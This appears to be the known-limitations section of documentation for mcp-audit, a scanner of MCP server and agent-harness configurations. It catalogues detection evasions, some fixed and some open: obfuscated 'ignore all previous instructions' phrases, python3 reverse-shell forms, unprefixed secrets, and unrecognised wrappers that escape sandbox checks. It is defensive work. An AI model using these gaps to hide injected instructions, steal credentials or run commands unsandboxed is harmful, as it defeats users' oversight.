- Credential env key-name patterns (private key, token, password) → confirmed closed — see COMM-021, COMM-022, COMM-023
- Unencrypted WebSocket in server args → confirmed closed — see COMM-026
- Temp/volatile directory in command or args → confirmed closed — see COMM-029 (HIGH)
- Absolute-path command (sideloading signal) → confirmed closed — see COMM-028
- Generic/unnamed server governance gap → confirmed closed — see COMM-027, COMM-030

**POISON-050 checks statically available description fields only.** The oversized-payload rule (POISON-050) is scoped to `name` and `description` keys in the raw server config — the fields an AI model reads when deciding whether to invoke a tool. Fields such as `command`, `args`, and environment variable values are intentionally excluded because they are not model-visible and do not constitute an attack surface for tool description padding. Additionally, tool manifests fetched at runtime via the MCP protocol (i.e., `ToolInfo.description` returned by a live `tools/list` call) are not checked by the static analyzer; connecting with `--connect` enumerates live tools and runs the poisoning patterns against their descriptions, but this requires a running server and an optional SDK dependency. As a result, POISON-050 will not fire for servers whose tool descriptions are only visible after protocol negotiation.

## Known detection evasions

Catalogued during the adversarial-probe pass (2026-06-14). An attacker who has
read mcp-audit's source can craft inputs that evade individual patterns. The
items below were confirmed by probing the compiled patterns directly.

### Fixed in the 2026-06-14 adversarial pass

These were confirmed-exploitable false negatives (the "`nc -e`" class — a
pattern that looked correct, passed its tests, but missed the most dangerous
real-world form) and are now closed with regression tests:

| Finding ID | Evasion that worked | Fix |
|---|---|---|
| HOOK-001 | `python3` / `python3.11` reverse-shell or exfil one-liners — a bare `\bpython\b` matched `python` but not `python3` (no word boundary before the digit), and the module list omitted `socket` | Clause broadened to `python[0-9.]*` and the network-module list extended to `socket`/`socketserver`/`http.server`/`httpx`/`smtplib`/`ftplib`; PowerShell `iwr`/`irm` aliases added |
| SC-001/002/003 | `python3 -m <typosquat>` and `/usr/bin/python3 -m <typosquat>` — the supply-chain gate matched only the exact string `python`, so every non-`python` interpreter spelling skipped typosquat detection entirely | `_is_python_interpreter()` now matches `python`, `python3`, `python3.N`, `py`, and absolute paths to them |
| POISON-012 | `ignore all previous instructions` — the single most common injection phrase — evaded because the regex demanded the literal `instructions` after exactly **one** adjective | Pattern now accepts 1–4 stacked adjectives and the verbs `ignore`/`disregard`/`forget` |
| POISON-060 | Fullwidth-ASCII (`ＩＧＮＯＲＥ`) and Mathematical-Alphanumeric (`𝐢𝐠𝐧𝐨𝐫𝐞`) homoglyphs — neither decomposes to Cyrillic/Greek, so the original two-range class missed them | Character class extended to `U+FF01–FF5E` and `U+1D400–1D7FF`; further hardened in the normalization pass below (Armenian/Cherokee/Coptic) |
| AUTH-002 | A dummy env var whose name merely *contained* `aud` (e.g. `AUDIO_PATH`, `FRAUD_FLAG`) silenced the finding, because the audience-env check used a raw substring test | Audience env-key fragments now matched as delimited tokens |
| HOOK-002 | `~/.augment/settings.json` (one of the 8 supported clients) was absent from the config-path list | `.augment/settings.json` added to `_HOOK_CONFIG_WRITE_RE` |

### Closed in the 2026-06-14 normalization pass

These items were open after the adversarial probe and were closed by adding a
Unicode normalization pass plus targeted pattern work. All carry regression
tests.

- **POISON-010..060 — homoglyph / compatibility / accent obfuscation
  (architecture-level).** `normalize_for_detection()` in `analyzers/poisoning.py`
  now folds text to ASCII *for matching only* before the literal patterns run:
  NFKD decomposition (fullwidth, math-alphanumeric, compatibility forms) → strip
  combining marks (category `Mn`, e.g. `cürl` → `curl`) → strip format chars
  (category `Cf`, i.e. zero-width spaces/joiners and soft hyphen) → a minimal
  hardcoded UTS #39 confusables map (Cyrillic / Greek / Armenian / Cherokee /
  Coptic look-alikes). This is wired into `PoisoningAnalyzer.analyze()`, the
  agent-file analyzer, and HOOK-001/002 matching, so a homoglyph-obfuscated
  `ignore previous instructions` or Cherokee `curl` now fires the literal
  pattern. POISON-060 itself is now driven by the union of the broad confusable
  ranges and the confusables-map code points, so Armenian/Cherokee/Coptic
  single-character substitutions fire it. Evidence always shows the attacker's
  original (un-normalized) bytes — the normalized form is never stored. The full
  4 MB UTS #39 dataset is intentionally not shipped; extending the minimal map to
  the complete confusables table is a separate research task.

- **POISON-020 — encoding-exfil evasion, closed with co-occurrence scoring.**
  `DetectionPattern.requires_cooccurrence` gates POISON-020 so an encoding verb
  only fires when an exfil-context term (`http`/`url`/`send`/`post`/`upload`/
  `webhook`/`endpoint`/…) appears within 200 characters. The encoding vocabulary
  was broadened to URL-safe base64 (`base64url`) and hex (`hex encode`,
  `binascii.hexlify`, `.encode('hex')`, …) without re-introducing the benign
  `base64 encode the image` false positive on the official filesystem server,
  which carries no destination term. Co-occurrence is matched on word boundaries
  so the `url` inside `base64url` cannot self-satisfy the gate.

- **SKILL-003 — non-`http(s)` schemes.** The agent-file URL detector now matches
  `ftp(s)://`, `ws(s)://` (a live bidirectional channel), and inline `data:`
  URIs. `data:` URIs get a distinct finding description ("may embed an obfuscated
  payload that is decoded and executed at runtime").

- **CRED-001 — credentials in URL userinfo.** `CredentialsAnalyzer` now parses
  `server.url` and fires CRED-001 (with the password redacted in the evidence,
  `https://user:***@host`) when a *literal* password is present in the userinfo
  component of any scheme. Env-var references (`${PASSWORD}`, `%PW%`) are not
  flagged. The `auth.py` docstring was updated to reflect this.

- **CRED-003 — literal secrets in authentication headers (closes the header-shaped
  half of the CRED-001/002 high-entropy gap below).** A `SECRET_PATTERNS`-based
  check would have missed exactly the config shape this rule targets: an opaque
  bearer token or raw JWT (`Bearer eyJhbGci…`) has no provider prefix and no
  quoted `key: "value"` form, so nothing in `SECRET_PATTERNS` matches it. CRED-003
  is key-driven instead — the header key (`Authorization`, `x-api-key`, etc.,
  `AUTH_HEADER_NAMES`, shared with AUTH-001's suppression list) already identifies
  the value as a credential, so no value pattern is needed. This closes the gap
  *for recognised auth-header keys specifically*; the underlying high-entropy
  detection gap remains open everywhere else (env vars, args, and a header under a
  *non-standard* key name), see below.

- **Obfuscation inside trigger words (now a real detection, not just
  defense-in-depth).** A zero-width space or a homoglyph mid-word in
  `ignore previous instructions` is folded away by `normalize_for_detection()`,
  so POISON-012 (and the rest of the literal set) now fires directly — in
  addition to POISON-040/060 still firing on the obfuscation character itself.

### Documented but not fixed (open)

- **CRED-001/002/003 — high-entropy tokens with no recognised prefix.**
  Evasion: a custom internal credential format (high entropy, no `sk-`/`ghp_`/
  `AKIA`/etc. prefix and not matching the generic `password|secret|token|api_key`
  `=`/`:`-quoted form) is not detected. This is the same class as the "Pattern
  coverage is thin" note — production scanners use 700+ patterns plus Shannon
  entropy. What would close it: an entropy-based detector with an allow-list, at
  the cost of a higher false-positive rate. CRED-003 closes this gap specifically
  for a header keyed under a name in `AUTH_HEADER_NAMES` (key-driven, no value
  pattern needed — see above), but a high-entropy secret under a *non-standard*
  header name (e.g. `X-Internal-Token: <opaque-value>` with no provider prefix)
  still falls through to the same `SECRET_PATTERNS` fallback CRED-001/002 use and
  is not detected.

- **POISON-060 — full UTS #39 confusables coverage.**
  The normalization pass closes the highest-risk confusable scripts (Cyrillic,
  Greek, Armenian, Cherokee, Coptic) with a minimal hardcoded map. Characters
  from the long tail of the UTS #39 confusables table (hundreds of additional
  blocks) are not mapped. Why not fixed: shipping the full 4 MB dataset and the
  skeleton algorithm is a separate research task with its own FP-tuning needs.

- **Supply chain — cross-naming-convention squatting.**
  Evasion: a malicious package named `mcp-official-filesystem` is plausible to a
  human but is a large Levenshtein distance from
  `@modelcontextprotocol/server-filesystem`, so typosquat detection never fires.
  PEP 503 normalisation only folds `-_.`/case; it does not bridge naming
  conventions. This is an inherent limitation of edit-distance typosquatting.
  What would close it: token-set / semantic similarity plus npm/PyPI popularity
  and publish-date signals (the registry already carries `first_published` and
  `weekly_downloads` for this purpose).

- **COMM-034 (God Key) — intentional boundary precision.**
  `MY_ADMIN` (no trailing `_`) and `XADMIN_KEY` (an alphabetic char immediately
  before `ADMIN`) do not fire. This is **by design**: the
  `(?<![A-Z0-9])(ADMIN|ROOT|MASTER|SUPERUSER)_` shape deliberately requires a
  delimiter before and an underscore after the keyword so that
  `ADMINISTRATOR_URL` and similar substrings do not produce false positives.
  Confirmed intentional; the FP tradeoff is accepted.

- **SAST — no cross-function taint (Semgrep OSS).**
  Evasion: a tainted URL or secret passed through an intermediate variable
  *across a function boundary* before reaching the sink evades the variable-URL
  SSRF and hardcoded-secret rules. Within a single function the variable-URL
  rules over-match (LOW confidence) rather than under-match. This is a hard
  limit of Semgrep OSS pattern mode — full dataflow taint requires Semgrep Pro.
  See "SAST Rules → No taint analysis" above. Not closeable without Semgrep Pro.

- **HOOK-002 — dynamically-constructed config paths.**
  The check is path-string based, which makes it robust to *write-method*
  variation (`tee`, `dd`, `sed -i`, `python -c "open(...)"` all fire as long as
  the literal config path appears). It does **not** fire when the target path is
  assembled at runtime (`os.path.join`, shell variable expansion, or base64-
  encoded path). Documented; closing it would require shell/Python parsing far
  beyond the hook-string regex's intent.

## Severity calibration

**Severity framework documented (2026-04-23).** Severity levels are now mapped to CVSS base score bands and OWASP Agentic Top 10 risk categories with written rationale for each finding ID. See `docs/severity-framework.md`. CVSS scores are approximate (no environmental/temporal modifiers applied) and should be reviewed by a credentialed practitioner before any formal CVE or compliance reporting.

## Supply Chain Attestation (Layer 1)

**Version extraction is best-effort.** mcp-audit recognises only the `npx package@version` invocation pattern when extracting the installed version from a server config. Servers installed via other mechanisms (pip, uvx, docker, system packages, direct binary path) cannot have their versions extracted automatically — an INFO finding is produced instead of a hash comparison.

**npm hashes are computed by mcp-audit on download, not sourced from a signed manifest.** PyPI publishes authoritative SHA-256 digests in its JSON API (`digests.sha256` in `/pypi/<pkg>/<version>/json`). npm's `integrity` field uses SHA-512 SRI format, not SHA-256. mcp-audit normalises to SHA-256 by downloading the tarball — meaning the hash is trustworthy only to the extent that the download path (npmjs.org CDN) is trustworthy. This is a weaker guarantee than PyPI's API-published digests.

**`--verify-hashes` requires outbound network access.** Scans run fully offline by default. When `--verify-hashes` is passed, mcp-audit makes HTTPS requests to registry.npmjs.org and pypi.org. If the network is unavailable, INFO findings are produced for packages that could not be verified — the scan does not fail.

~~**Layer 2 (Sigstore signature verification) and Layer 3 (dependency SBOM) are not yet implemented.**~~ **Layer 2 resolved 2026-04-23.** **Layer 3 resolved 2026-04-23.** `scan --verify-signatures` fetches SLSA provenance bundles from the npm and PyPI attestation APIs and verifies them with the `sigstore` Python library (Fulcio cert chain, SCT, Rekor inclusion proof). `scan --check-vulns` resolves transitive dependency graphs via [deps.dev](https://deps.dev) and queries [OSV.dev](https://osv.dev) for known CVEs; emits `VULN-<OSV-ID>` findings. `mcp-audit sbom` generates a CycloneDX 1.5 JSON SBOM. `--vuln-registry URL` allows a custom OSV-compatible endpoint. All features are free for all users (Apache 2.0; no paid tiers). See `docs/supply-chain.md` for full documentation.

## Supply chain coverage

~~**Only npm packages are checked for typosquatting.**~~ **Resolved 2026-05-17 (STORY-0034).** The supply chain analyzer now covers both the npm ecosystem (npx/bunx/pnpx/yarn dlx) and the Python ecosystem (uvx, pipx, python -m). Python package names are normalised per PEP 503 before comparison so `mcp_server_filesystem` and `mcp-server-filesystem` are treated identically. Three new PyPI entries added to the registry (`mcp-server-filesystem`, `mcp-server-git`, `mcp-server-postgres`); all existing `"source": "pip"` entries updated with `"package_ecosystem": "pypi"`. Docker image verification, Go module typosquatting, and other ecosystems remain uncovered.

~~**Registry size is below launch target.**~~ **Resolved 2026-05-02.** The known-server registry now ships with 75 entries, meeting the launch target. Eleven new entries were added covering major ecosystem integrations: `@github/github-mcp-server`, `@playwright/mcp`, `tavily-mcp`, `firecrawl-mcp`, `mcp-server-qdrant`, `@neondatabase/mcp-server-neon`, `@shopify/dev-mcp`, `mcp-atlassian`, `@agentdeskai/browser-tools-mcp`, `@azure/mcp`, and `langchain-mcp-adapters`. Community contributions are still welcome — open a PR against `registry/known-servers.json`. See `docs/registry-contributions.md` for the contribution guide.

~~**Levenshtein threshold may produce false positives for short package names.**~~ **Resolved 2026-04-30.** Package names of 5 characters or fewer now use a tighter threshold of 1 edit instead of 3. Names of 6+ characters keep the existing threshold of 3. The fix is in `analyzers/supply_chain.py` (`typo_threshold = 1 if len(package) <= 5 else 3`). Covered by `tests/test_supply_chain.py::TestShortNameThreshold`.

**SC-004 is version-aware only for exact pins.** *Partially resolved 2026-10-11 (STORY-0078); severity calibrated 2026-10-13 (STORY-0083): an unpinned launch whose every listed CVE has a recorded fix is MEDIUM, not HIGH.* SC-004 now emits one finding per package and drops a CVE when the launch command pins an exact version at or above that CVE's `fixed_in` (structured `known_vulns` records). It still never resolves ranges: a range or an unpinned launch reports every recorded CVE, because an offline scan cannot know what will be installed. Entries with only bare `known_vulnerabilities` IDs (no `fixed_in`) are always reported. `--check-vulns` (network, OSV.dev) remains the version-aware path for unpinned configs. **Also fixed in STORY-0078:** before it, a pinned spec (`npx @scope/pkg@1.2.3`, `uvx pkg==1.2.3`) never matched its registry entry at all, so SC-004, typosquat detection and TRANSPORT-003's registry tiering all skipped pinned configs.

**Registry advisory data comes from OSV, which can't see everything (STORY-0083).** `scripts/sync_registry_advisories.py` and the weekly `registry-advisory-sync.yml` check use OSV's per-package query. Unreviewed GitHub advisories carry no package data, so they are invisible until GitHub reviews them; mcp-remote's six 2026 advisories were entered by hand for that reason. NVD-only CVEs are not covered. `MAL-*` malicious-package records are not merged into `known-servers.json`; since STORY-0097 they go to `registry/known-malicious.json` (SC-008, below). `fixed_in` is the highest fix across an advisory's ranges, so a pinned version fixed on an older release line can still be reported (conservative). `fixed_in` for mcp-remote's 2026 advisories (0.1.39) is inferred from "0.1.x through 0.1.38" in the CVE records.

**SC-007 (unscoped twins) knows only the shapes it was measured on (STORY-0097).** A twin is derived from a registry entry: the name part of `@scope/server-<x>` or `@scope/mcp-server-<x>`, the `mcp-server-<x>` spelling of `@scope/server-<x>` or `@scope/<x>-mcp-server`, or the same `mcp-server-<x>` name across npm and PyPI. Squats of packages outside the 55-entry registry are invisible to it (OSV's `mcp-server-figma` and `mcp-server-sentry` have no registry entry; SC-008 still catches those two by exact name). Other plausible spellings (`<x>-mcp`, `<x>-mcp-server`, `mcp-<x>`) are deliberately not keys: they are the names community servers for the same product naturally take (an unrelated `notion-mcp-server` has ~2,500 weekly downloads). A lookalike under a different scope (`@evil/server-github`) is left to SC-001..003, which only see it when it is within 3 edits. SC-007 cannot tell a squat from a small community package that took the official server's name: on 2026-10-25, of the 21 twin names published on npm, 6 were small live packages (7 to 158 weekly downloads), one with a real repository (a Google Maps server), and on PyPI 2 of 5 were small community servers; those fire MEDIUM (SC-007 ships MEDIUM for this reason; the twins OSV lists as malicious are CRITICAL under SC-008). Allowlisting the package in a governance policy's `approved_servers` records the decision but does not silence SC-007: mcp-audit has no per-finding suppression. Precedence over SC-001..003 means a twin that is also one or two edits from another registry entry reports MEDIUM (SC-007) rather than CRITICAL or HIGH (SC-001/002); on 2026-10-25 no real registry name was in that position (the one real collision, `uvx mcp-server-github`, was SC-003 MEDIUM before).

**SC-008 (known-malicious packages) covers MCP-named packages only, and is as current as the last release (STORY-0097).** `registry/known-malicious.json` keeps OSV `MAL-*` records for npm and PyPI packages whose name contains `mcp` or that the registry lists (217 records on 2026-10-25). A malicious package configured as an MCP server under a name without `mcp` is not matched (the Paperclip PyPI packages `browser-use-headless`/`paperclip-ai`, MAL-2026-10484/10869, and SANDWORM_MODE's `claud-code`-style names are outside the selection; `scan --check-vulns` still finds them over the network). The file updates with each mcp-audit release; `update-registry` does not refresh it, and OSV itself publishes a record only after someone detects the package. Twin names without `mcp` (`server-github`) are not mirrored: none had an OSV record on 2026-10-25 (npm's own takedown of `server-github` left no OSV record). Version semantics follow OSV except for one documented case: for a registry-listed package, a blanket all-versions range next to an explicit version list is ignored. For a package not in the registry, OSV's blanket range is taken as stated even when the package still serves other releases: of the 64 npm records with a blanket range on 2026-10-25, 4 non-registry packages (`@relyt/claude-context-mcp`, `@relyt/mcp-server-relytone`, `lite-serper-mcp-server`, `mcp-knowledge-base`) still served versions outside the record's list, so pinning one of those still reports CRITICAL. An unpinned launch of a package with only past malicious releases is MEDIUM; that fires on 1 of the 100 most-downloaded npm MCP servers when launched unpinned (`@mastra/mcp-docs-server`, release 1.1.47). **Launch-command parsing limits (all supply-chain checks, SC-001..008):** the launcher is recognised as `npx`/`bunx`/`pnpx`/`yarn dlx`/`uvx`/`pipx`/`python -m` under any path, any case, a Windows `.cmd`/`.exe`/`.bat`/`.ps1` wrapper, or behind `cmd /c`/`cmd /k` (STORY-0097 review); a whole command line in one `cmd /c` argument is split with the Microsoft C runtime rules (STORY-0103), but `cmd`'s own quote stripping (`/s`, and its rule for a line with more than two quotes) is not modelled, so a line `cmd` itself would fail to run can still be reported; `pnpm dlx`, `npm exec`, `uv run --with`, `powershell -Command` and `bash -c` launches are not recognised. With `npx -p <pkg> <bin>` or `npx --package=<pkg> <bin>`, the name checked is the bin, not the package. **Twin keys come from whatever registry is loaded:** a user-local cache written by `update-registry`, or `--registry PATH`, changes the set of twins (the shipped-registry measurements above don't apply to a custom registry).

**Rug-pull compares config entries, not tool definitions (STORY-0084).** `analyzers/rug_pull.py::compute_hashes` hashes a server's `command`, `args`, environment variable names and raw config entry. A server whose launch line is unchanged but whose tools now say something different (a new release behind an unpinned `npx`, or a remote server that changed) is not detected. Live tool definitions from `--connect` go to the poisoning analyzer only. *Partly closed 2026-10-13 (STORY-0086):* `lock --connect` / `lock --verify --connect` record and compare tool-definition digests in `mcp-lock.json` (LOCK-006..009). Rug-pull itself still hashes config entries only.

**Tool-definition digests are a review-time check (LOCK-006..009, STORY-0086).** `lock --verify --connect` compares the tool list a server gives at the moment it is listed, right after the handshake. A server that changes its tools later in a session (after some calls, or by sending `notifications/tools/list_changed`) is not caught; neither is one that serves different tools to different callers (per-user or per-token tool lists digest differently for each). Only tools are recorded, not resources or prompts. `title` counts as text with `description` (LOCK-008), but a title inside `annotations` is part of the contract (LOCK-007). A server whose tools could not be listed in full is reported as unverified rather than compared. `tools._checksum` is unkeyed: it catches hand edits, not someone who recomputes it, and renaming `_producer` or bumping `_schema_version` turns the section foreign, which `--allow-unverified` waives along with everything else unverified. `scan` and `check` never start servers, so their `Lock:` line says tool definitions were not compared. Proven end to end against two Python test servers (3 tools, and 250 tools in pages of 100) under `mcp` 1.27 and 2.3, which produced identical digests; not yet run against a large real-world server such as github-mcp-server. The GitHub Action's `lock-verify` input does not pass `--connect`.

**Mods: static read only, and the guard is only partly visible (STORY-0085).** MOD-* read each hooks module and its relative imports; they never run it. A `${...}` expression inside a template literal is not scanned, and imports from outside the plugin directory are ignored (Claude Code rejects them). The rules say what a mod *can* do, not what it does: a mod that hooks `tool.check` to deny risky calls (a guard) reports MOD-001 the same as one that approves everything. The built-in guard's state is inferred from the managed settings file only; MDM, registry or server-delivered managed settings and a Team/Enterprise sign-in are invisible offline, so "no managed settings file" is reported as "guard not detected". Organization-installed mods (loaded in place from a managed marketplace directory) are not told apart from user mods.

**Plugins: Claude Code only, and PLUGIN-001 compares against today's pin (STORY-0080).** Codex, Copilot and Gemini CLI plugin stores are not read. PLUGIN-001 compares the recorded version with the marketplace's *current* pin. It does not hash plugin files, so it cannot see a Plugin4Shell-style swap that the agent recorded at the requested commit (the agents reported the pinned commit after a swap); a mismatch usually means a plugin not updated since the pin moved. The finding is MEDIUM. The check is skipped for `git-subdir` sources, for plugins whose `plugin.json` or marketplace entry sets `version`, and for recorded versions of `unknown`. The agent's own version (Plugin4Shell is fixed in Claude Code 2.1.179) is not read, because mcp-audit does not execute the agent. Plugin hooks (`hooks/hooks.json`), agents and MCP bundles (`.mcpb`/`.dxt`) are not scanned; `plugin.json` `mcpServers` given as a path is skipped. Plugin MCP servers are analyzed together with the rest of the scan, but `plugins scan` keeps only the findings attributed to `claude-code-plugin`. Plugin config paths are left out of the rug-pull state key (they contain the plugin version), so a plugin update does not reset anyone's rug-pull history; a plugin server that is renamed by an update is seen as a new server.

**HARNESS-001..006 evaluate each settings file alone (STORY-0079, STORY-0087).** HARNESS-006 only sees a delete guard in the same file: bypass mode in project settings with the guard hook in `~/.claude/settings.json` still fires, and any PreToolUse hook matching shell commands counts as a guard because the hook's script isn't read. HARNESS-005's command list is a fixed set; a rule for an unlisted powerful command is not flagged. Claude Code merges user, project, local and managed settings with precedence; mcp-audit checks what each file asks for, not the effective setting. The only in-file interaction honoured is `disableBypassPermissionsMode: "disable"` suppressing HARNESS-001/003 in the same file, so a managed-settings lock elsewhere does not suppress a finding. Managed settings themselves are not discovered. Other harnesses' equivalent switches are checked only where a repository plants them: a project `.codex/config.toml`'s `approval_policy`/`sandbox_mode` is TRUST-008 (STORY-0090), but the user-level `~/.codex/config.toml`, Gemini CLI per-server `trust`, Cline `autoApprove` and VS Code `chat.tools.autoApprove` are not checked, because mcp-audit does not discover those settings files today.

**PERM-001..007 read rules, not the effective policy (STORY-0092).** Each settings file is checked on its own, like HARNESS-*: `sandbox.enabled: true` in `~/.claude/settings.json` does not silence a project file's PERM-004 or PERM-005, and a `sandbox.enabled` set only elsewhere does not raise PERM-005 or PERM-006. Managed settings (including `allowManagedPermissionRulesOnly`, which makes Claude Code ignore every other file's rules) are not discovered. The installed Claude Code version is not read, so rules whose behaviour changed are judged by the current docs: before 2.1.299 a bare `mcp__a` allow also reached a server named `a__b`, and PERM-007 does not report that older reach. PERM-002 checks project and local settings only for filesystem-root directory names (`/Users`, `/home`, `/etc`, `/tmp`, …) and assumes the session starts at the directory that holds `.claude/`; a rule anchored at a real project directory of the same name is skipped. PERM-003 reports only a `*` that extends the program name, not one that extends an argument (`Bash(npm run test*)`). PERM-004's command list is fixed (network tools, delete tools, `git push`) and covers Bash rules only; PowerShell's own bypass forms are not documented and not checked. PERM-004 counts a `defaultMode` of `bypassPermissions` or `auto` only in user settings, because the settings reference says those modes don't take effect from project or local settings; before Claude Code 2.1.257 `bypassPermissions` did take effect from any file, so on an older install a project file's bypass mode is under-reported (INFO, not MEDIUM). Its allow-side test counts only rules that approve any shell form (`Bash`, `Bash(sh -c *)`, `Bash(env *)`, `Bash(sudo -E *)`, `Bash(* --version)`, an absolute directory such as `Bash(/usr/bin/*)`); a launcher narrowed to a script (`Bash(bash scripts/test.sh *)`) or a relative directory (`Bash(./scripts/*)`) does not raise it, even though such a script could itself run the missed form. **PERM-007 trades recall for precision.** It counts only HIGH/CRITICAL findings that indict the server itself: poisoning, rug-pull, and supply-chain, with SC-004 only when the configured version is known to be affected (a pinned version). Not counted: toxic-flow TOXIC-*/INTEG-* (capability combinations many legitimate servers have, already reported at their own severity), SC-004 on an unpinned launch (version unknown offline), findings about the config file, credentials, transport, auth or community rules, and attestation findings, which `--verify-hashes`/`--verify-signatures` add after the pipeline. Measured on a 34-server fixture of commonly configured servers with every server allow-listed: 6 PERM-007 before this narrowing (two unpinned SC-004 with no recorded fix, four single-server toxic flows), 0 after; the typosquat case still fires. So an allow-listed server whose only serious finding is an unfixed CVE on an unpinned launch, or a single-server exfiltration pair, gets no PERM-007 (its own finding still reports it). Under `scan --project`, PERM-007 also pairs the default scan's settings files with the repository's servers and the reverse; the default scan's settings files are found again with the same `--path`, and a pair already reported is not repeated. It reads whole-server rules only (`mcp__<server>`, `mcp__<server>__*`), not tool-prefix globs such as `mcp__github__get_*`; a plugin server is matched only when its `plugin.json` has a `name`. HARNESS-005's runner forms skip one target argument (container, image, pod or directory) and options; a runner rule with option values (`docker run -v a:b image *`) can be missed, and three-word runners (`docker compose exec`) and `nix-shell --run` are not in the table. Not built, because no Anthropic document supports them as findings: `ask` rules under `auto`/`bypassPermissions` (they still prompt), label-vs-canonical tool names, `!` carve-outs that carve nothing (they make a deny stronger), and `Agent(model:*)` on an omitted parameter.

**SANDBOX-001..005 read each settings file alone, and decide git state from ignore files (STORY-0093).** Like HARNESS-* and PERM-*, each settings file is checked on its own, except that two keys of the user's own `~/.claude/settings.json` (or `$CLAUDE_CONFIG_DIR/settings.json`) set severities: `sandbox.network.strictAllowlist: true` lowers SANDBOX-003 and a proxy port to INFO, and `permissions.defaultMode` `bypassPermissions` or `auto` raises SANDBOX-002 to HIGH. Managed settings and `--settings` are not discovered, so two kinds of lock are invisible. A sandbox they make admin-required (`allowUnsandboxedCommands: false` in managed settings or `--settings`, or `allowManagedDomainsOnly: true` in managed settings; Claude Code 2.1.285 or later), under which Claude Code ignores a repository's loosening keys, still gets SANDBOX-001..003. And the "Locks that apply without an admin-required sandbox": `network.strictAllowlist` in managed settings or `--settings` (Claude Code ignores a repository's `allowedDomains`, proxy ports and `WebFetch(domain:…)` allow rules), and `network.deniedDomains` or a `WebFetch(domain:…)` deny rule there (it ignores the repository's proxy ports). Each finding names the locks that would make Claude Code ignore it. The installed Claude Code version is not read: before 2.1.285 any settings file could set a proxy port and none of these locks existed. SANDBOX-001 reports the four Booleans the sandboxing doc says weaken the sandbox, `enabled`/`failIfUnavailable` set to `false` in the shared `.claude/settings.json` (not in `.claude/settings.local.json`, where Claude Code's `/sandbox` panel writes `enabled`), and the proxy ports; it does not know the platform, so a macOS-only key (`enableWeakerNetworkIsolation`, `allowLocalBinding`) is reported on a repository opened on Linux too. SANDBOX-002 reports an `excludedCommands` entry only when its arguments are left open (`python *`, `npx *`, `docker compose *`, `timeout 30 *`); a pattern narrowed to a script or subcommand (`python scripts/x.py *`, `uv run pytest *`, `make *`, `npm test`) is not reported, even though the sandboxing doc warns that Claude can edit such a script and then run it unsandboxed. Option values before the wildcard (`docker --context x *`) and `kubectl`/`gh`/cloud CLIs (which run outside with your credentials) are not reported. Wrappers recognised as running what follows them: `env` and the permissions doc's `timeout`, `time`, `nice`, `nohup`, `stdbuf`, `command`, `builtin`, `noglob`, `watch`, `setsid`, `ionice`, `flock`. Other programs that run their argument are not: `doas`, `su -c`, `runuser`, `chroot`, `nsenter`, `taskset`, `chrt`, `numactl`, `cgexec`, `firejail`, `systemd-run`, `script -c`, `strace`, `ltrace`, `gdb`, `valgrind`, `parallel`, `entr`, `caffeinate`, `arch`, `open` (macOS), `cmd /c`, `start`, `wsl` (Windows), and `find … -exec`. `sudo *`, `eval *` and `xargs *` are not reported because the settings reference says Claude Code keeps a call that starts with them sandboxed, and `unshare` likewise. SANDBOX-002's severity pairs an entry only with allow rules in the same file, matched word by word from the start (`Bash(docker *)` and `Bash(docker compose up)` overlap `docker compose *`; a `*` word in an allow rule matches any word, as in `Bash(docker * up)`, but a wildcard inside a word, as in `Bash(dock* up)`, is compared literally). Allow rules in other files, an ask rule that would still prompt under `bypassPermissions`, and a mode chosen on the command line (`--permission-mode`, `--dangerously-skip-permissions`) are not seen, and a repository file's own `defaultMode` is not counted (the settings reference says `auto` and `bypassPermissions` "don't take effect from project or local settings"; before 2.1.257 `bypassPermissions` did, so an older install is under-reported). Only `docker.sock`, `podman.sock` and `containerd.sock` socket names are recognised in `allowUnixSockets`. SANDBOX-003's host list is fixed (code hosts, paste sites, webhook receivers named by MITRE T1567.001/.003/.004 plus `*`); cloud storage (T1567.002), npm and PyPI upload hosts, and content hosts added through `WebFetch(domain:…)` allow rules (which feed the same allowlist) are not reported. Not built (each is a documented loosening, but a finding needs a precision measure first): `filesystem.allowWrite` to shell startup files or `$PATH` directories (the doc's "Filesystem permission escalation"), `allowMachLookup` (`"*"` admits every XPC service), `ignoreViolations` (hides reports, the sandbox still blocks), a repository's `autoAllowBashIfSandboxed: true` over a user's `false`, `allowUnsandboxedCommands: true` (overrode a user's `false` before 2.1.285), and managed-only keys outside the `sandbox` block (`allowManagedHooksOnly`, `allowManagedPermissionRulesOnly`, `strictKnownMarketplaces`). Git state never comes from running git. A file is treated as headed for git when it sits in a work tree (a `.git` entry at or above the project) and no ignore file matches it; `.git/index` is not read, so a local file that is already tracked but also matched by an ignore file (added with `git add -f`, or ignored after it was committed) is treated as the user's own: no SANDBOX-005, and its loosening keys are not reported. A local file outside any work tree is the user's own too, and one reached through a symlinked directory other than `.claude` has an unknown state. Ignore files read: `.gitignore` files from the work-tree root down, `.git/info/exclude` (not for a worktree or submodule whose `.git` is a file), and the global excludes file from `core.excludesFile` in `~/.gitconfig` or `$XDG_CONFIG_HOME/git/config` (or the XDG default), following a plain `[include] path = …` there one level (at most 16 targets); not the repository's own or the system git config, `includeIf`, nested includes, or `GIT_CONFIG_GLOBAL`. Matching is case-sensitive (git's `core.ignoreCase` on macOS and Windows is not modelled). A `core.excludesFile` set to a relative path is treated as no global excludes file. An ignore file that can't be read, is over 1 MiB, or falls outside the scan's 512-file / 8 MiB budget, or a scan that spends its 5,000,000 pattern-matching steps, makes the file's state unknown: no SANDBOX-005, a local file's SANDBOX-001..003 at MEDIUM at most, and the reason in the scan's errors. The LOW username check covers `/Users/<name>`, `/home/<name>`, `C:\Users\<name>` and `/c/Users/<name>`, skips a fixed list of placeholder and CI/container/Homebrew account names, and looks at the first 20,000 strings and 16 KiB of each. Config-level findings, these included, are reported twice under `scan --project .` when the default scan already read the same file (pre-existing behaviour shared with HARNESS-* and PERM-001..006).

**SC-005 (deprecated packages, STORY-0073) has no registry-level maintenance-status field.** `mcp-lock.json`'s `package.deprecated` and `SC-005` are populated from the live npm registry response at `lock` resolution time only; `registry/known-servers.json` itself carries no independent "maintained/deprecated" flag an offline scan could check, so eleven of the fifteen `@modelcontextprotocol/server-*` entries currently ship in the registry with no indication their npm `latest` is deprecated — see backlog item for a future registry-wide audit. **PyPI "yanked" releases are not covered at all**: PyPI's JSON API exposes `yanked`/`yanked_reason` only per-release inside `releases`, not on the `info` object `resolve_latest_version_info()` reads for the latest version, so `deprecated` is always `null` for PyPI packages today.

